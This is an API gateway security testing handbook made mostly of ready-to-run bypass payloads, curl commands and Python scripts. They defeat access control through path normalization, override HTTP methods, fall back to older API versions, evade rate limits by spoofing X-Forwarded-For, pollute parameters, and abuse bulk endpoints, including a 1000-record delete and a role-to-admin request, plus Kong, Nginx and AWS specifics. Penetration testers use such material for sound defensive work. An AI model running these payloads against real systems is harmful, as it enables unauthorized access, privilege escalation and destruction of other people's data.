# API Gateway Security Testing Handbook

## 1. Path Normalization Bypass

### 1.1 Principle

```
The API gateway and backend service normalize paths inconsistently.

Gateway: /api/admin → access denied
Backend: /api/./admin → normalized to /api/admin → access granted

Result: bypass the gateway's access control
```

### 1.2 Common Payloads

```bash
# Dot bypass
/api/./admin
/api/admin/.
/api/./admin/.

# Double slashes
/api//admin
/api///admin

# URL encoding
/api/%2e/admin
/api/%2e%2e/admin
/api/%2f/admin

# Semicolon bypass (Spring Boot)
/api/;/admin
/api/admin;/

# Backslash (Windows)
/api\admin
/api\\admin

# Mixed
/api/.;/admin
/api/;./admin
/api/%2e;/admin
```

### 1.3 Test Script

```python
import requests

def test_path_normalization(base_url, protected_path):
    """Test path normalization bypass"""
    
    payloads = [
        f"{protected_path}",
        f"./{protected_path}",
        f"{protected_path}/.",
        f"/{protected_path}",
        f"//{protected_path}",
        f"/{protected_path.replace('/', '%2f')}",
        f"/{protected_path.replace('/', '%2e/')}",
        f";/{protected_path}",
        f"{protected_path};/",
        f"/.;/{protected_path}",
    ]
    
    for payload in payloads:
        url = f"{base_url}{payload}"
        r = requests.get(url)
        
        print(f"[{r.status_code}] {payload}")
        
        if r.status_code == 200:
            print(f"    [!] Bypass may have succeeded")
            print(f"    Response length: {len(r.text)}")

# Usage example
test_path_normalization("https://target.com", "/api/admin")
```

---

## 2. HTTP Method Override

### 2.1 Principle

```
Some API gateways support overriding the HTTP method via a request header

GET /api/user/123 → read-only, allowed
DELETE /api/user/123 → delete, denied

GET /api/user/123
X-HTTP-Method-Override: DELETE
→ Gateway sees GET, lets it through
→ Backend sees DELETE, performs the deletion
```

### 2.2 Common Headers

```bash
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
X-HTTP-Method: DELETE
X-Method: DELETE
_method: DELETE
```

### 2.3 Test Script

```bash
# Test method override
curl -X GET "https://target.com/api/user/123" \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Authorization: Bearer TOKEN"

curl -X POST "https://target.com/api/user/123" \
  -H "X-Method-Override: PUT" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

---

## 3. API Version Fallback

### 3.1 Principle

```
Older API versions may lack security checks

/v2/api/user → has permission checks
/v1/api/user → no permission checks (deprecated but not taken offline)
```

### 3.2 Test Method

```bash
# Enumerate API versions
curl "https://target.com/v1/api/user"
curl "https://target.com/v2/api/user"
curl "https://target.com/v3/api/user"
curl "https://target.com/api/v1/user"
curl "https://target.com/api/v2/user"

# Test whether older versions have vulnerabilities
# 1. Missing permission checks
# 2. Insufficient input validation
# 3. Known vulnerabilities unpatched
```

### 3.3 Automated Script

```python
def test_api_versions(base_url, endpoint):
    """Test API version fallback"""
    
    versions = ["v1", "v2", "v3", "v4", "v5"]
    patterns = [
        f"/{{}}/{endpoint}",
        f"/{endpoint}/{{}}",
        f"/api/{{}}/{endpoint}",
        f"/api/{endpoint}/{{}}",
    ]
    
    for version in versions:
        for pattern in patterns:
            path = pattern.format(version)
            url = f"{base_url}{path}"
            
            r = requests.get(url)
            
            if r.status_code != 404:
                print(f"[{r.status_code}] {path}")
                
                # Test whether there are permission checks
                r_unauth = requests.get(url)  # without token
                if r_unauth.status_code == 200:
                    print(f"    [!] No permission checks")
```

---

## 4. Rate Limit Bypass

### 4.1 X-Forwarded-For Rotation

```python
import requests
import random

def bypass_rate_limit_xff(url, count=100):
    """Bypass rate limits by rotating X-Forwarded-For"""
    
    for i in range(count):
        # Generate a random IP
        fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        headers = {
            "X-Forwarded-For": fake_ip,
            "X-Real-IP": fake_ip,
            "X-Originating-IP": fake_ip,
        }
        
        r = requests.get(url, headers=headers)
        print(f"[{i+1}] {fake_ip} → {r.status_code}")
        
        if r.status_code == 429:
            print("    Rate limit still in effect")
            break
```

### 4.2 API Key Rotation

```python
def bypass_rate_limit_keys(url, api_keys):
    """Bypass rate limits by rotating API keys"""
    
    for i, key in enumerate(api_keys):
        r = requests.get(url, headers={"X-API-Key": key})
        print(f"[{i+1}] Key {key[:10]}... → {r.status_code}")
```

### 4.3 Endpoint Variants

```bash
# Different endpoints with the same functionality may have independent rate limits

# Endpoint 1
curl "https://target.com/api/search?q=test"

# Endpoint 2 (same functionality)
curl "https://target.com/api/v2/search?q=test"
curl "https://target.com/search?q=test"
curl "https://target.com/api/query?keyword=test"
```

---

## 5. API Documentation Leakage

### 5.1 Common Paths

```bash
# Swagger / OpenAPI
/swagger.json
/swagger.yaml
/openapi.json
/openapi.yaml
/api-docs
/api-docs.json
/v2/api-docs
/v3/api-docs
/swagger-ui.html
/swagger-ui/
/api/swagger.json
/api/swagger-ui.html

# GraphQL
/graphql
/graphiql
/graphql/schema
/graphql/console

# RAML
/api.raml
/raml/api.raml

# API Blueprint
/api.apib
/apiary.apib

# WADL
/application.wadl
/api/application.wadl
```

### 5.2 Automated Scanning

```bash
# ffuf batch detection
ffuf -u "https://target.com/FUZZ" \
  -w api-docs-paths.txt \
  -mc 200,301,302 \
  -o api-docs-results.json

# Extract API documentation URLs from JS files
grep -rE "(swagger|openapi|api-docs)" *.js
```

### 5.3 Exploiting API Documentation

```python
import requests
import json

def exploit_swagger(swagger_url):
    """Extract all endpoints from a Swagger document"""
    
    r = requests.get(swagger_url)
    swagger = r.json()
    
    base_path = swagger.get('basePath', '')
    paths = swagger.get('paths', {})
    
    endpoints = []
    
    for path, methods in paths.items():
        for method, details in methods.items():
            endpoint = {
                'path': base_path + path,
                'method': method.upper(),
                'summary': details.get('summary', ''),
                'parameters': details.get('parameters', []),
            }
            endpoints.append(endpoint)
    
    return endpoints

# Usage example
endpoints = exploit_swagger("https://target.com/swagger.json")

for ep in endpoints:
    print(f"{ep['method']} {ep['path']}")
    print(f"  {ep['summary']}")
    
    # Test each endpoint
    # ...
```

---

## 6. Bulk Operation Abuse

### 6.1 Principle

```
Bulk APIs may bypass per-record limits

Single: POST /api/user → rate limit 10 requests/minute
Bulk: POST /api/users/batch → rate limit 10 requests/minute, but each call can process 100 records

Result: effectively 1000 records/minute
```

### 6.2 Test Method

```bash
# Find bulk endpoints
/api/users/batch
/api/users/bulk
/api/users/import
/api/batch
/api/bulk

# Test bulk operations
curl -X POST "https://target.com/api/users/batch" \
  -H "Content-Type: application/json" \
  -d '{
    "users": [
      {"id": 1, "action": "delete"},
      {"id": 2, "action": "delete"},
      ...
      {"id": 1000, "action": "delete"}
    ]
  }'
```

---

## 7. HTTP Parameter Pollution (HPP)

### 7.1 Principle

```
The gateway and backend handle duplicate parameters inconsistently

Request: /api/user?id=1&id=2

Gateway: takes the first id=1 → checks permissions (own ID) → lets it through
Backend: takes the last id=2 → returns another user's data

Result: unauthorized access
```

### 7.2 Test Method

```bash
# Duplicate parameters
curl "https://target.com/api/user?id=MY_ID&id=VICTIM_ID"

# Array parameters
curl "https://target.com/api/user?id[]=MY_ID&id[]=VICTIM_ID"

# JSON parameter pollution
curl -X POST "https://target.com/api/user" \
  -H "Content-Type: application/json" \
  -d '{"id": "MY_ID", "id": "VICTIM_ID"}'
```

---

## 8. Kong-Specific Bypasses

### 8.1 Path Normalization

```bash
# How Kong handles paths
/api/admin → denied
/api/%61dmin → bypass (URL decoding)
/api/admin%2f → bypass (trailing slash)
```

### 8.2 Plugin Bypass

```bash
# Kong plugins may be misconfigured

# Test the JWT plugin
curl "https://target.com/api/protected" \
  -H "Authorization: Bearer invalid_token"

# Test the ACL plugin
curl "https://target.com/api/admin" \
  -H "X-Consumer-Groups: admin"
```

---

## 9. Nginx-Specific Bypasses

### 9.1 merge_slashes

```bash
# When Nginx merge_slashes is off
/api//admin → slashes not merged
/api///admin → may bypass rules
```

### 9.2 proxy_pass Misconfiguration

```nginx
# Misconfiguration
location /api/ {
    proxy_pass http://backend/;
}

# Request: /api/../admin
# Forwarded: http://backend/../admin → http://backend/admin
```

---

## 10. AWS API Gateway-Specific Bypasses

### 10.1 Resource Policy Bypass

```bash
# Test IP whitelist
curl "https://api-id.execute-api.region.amazonaws.com/prod/endpoint" \
  -H "X-Forwarded-For: allowed IP"
```

### 10.2 Lambda Authorizer Bypass

```bash
# Test authorizer logic
curl "https://api-id.execute-api.region.amazonaws.com/prod/endpoint" \
  -H "Authorization: Bearer malformed_token"

# Observe error messages, which may leak authorization logic
```

---

## 11. Testing Tools

### Arjun (Parameter Discovery)

```bash
# Install
pip3 install arjun

# Discover hidden parameters
arjun -u https://target.com/api/user

# May discover: debug=1, internal=1, admin=true
```

### Kiterunner (API Endpoint Discovery)

```bash
# Install
go install github.com/assetnote/kiterunner@latest

# Scan API endpoints
kr scan https://target.com -w routes.txt

# Use the Assetnote wordlist
kr scan https://target.com -A=apiroutes-210228
```
